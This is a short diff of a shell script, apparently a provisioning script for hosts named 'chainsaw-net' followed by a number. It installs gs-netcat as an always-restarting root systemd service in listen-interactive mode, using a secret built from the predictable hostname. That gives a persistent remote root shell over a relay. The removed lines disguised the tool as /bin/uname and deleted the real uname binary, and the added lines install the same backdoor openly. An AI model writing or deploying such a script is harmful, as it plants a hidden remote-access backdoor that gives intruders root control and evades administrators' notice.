@@ -15,9 +15,9 @@ num=$(printf "%04d\n" $num)
 machine="chainsaw-net"$num
 
 tar -xvf /tmp/gs-netcat.tar.gz -C /tmp/
-chmod +x /tmp/gs-netcat && mv /tmp/gs-netcat /tmp/uname
-rm /bin/uname /tmp/gs-netcat*
-mv /tmp/uname /bin/uname
+chmod +x /tmp/gs-netcat
+rm /tmp/gs-netcat.tar.gz
+mv /tmp/gs-netcat /bin/gs-netcat
 
 cat << EOF > /etc/systemd/system/gs.service
 [Unit]
@@ -28,7 +28,7 @@ StartLimitIntervalSec=0
 Restart=always
 RestartSec=1
 User=root
-ExecStart=/usr/bin/uname -li -s $machine
+ExecStart=/usr/bin/gs-netcat -li -s $machine
 [Install]
 WantedBy=multi-user.target
 EOF
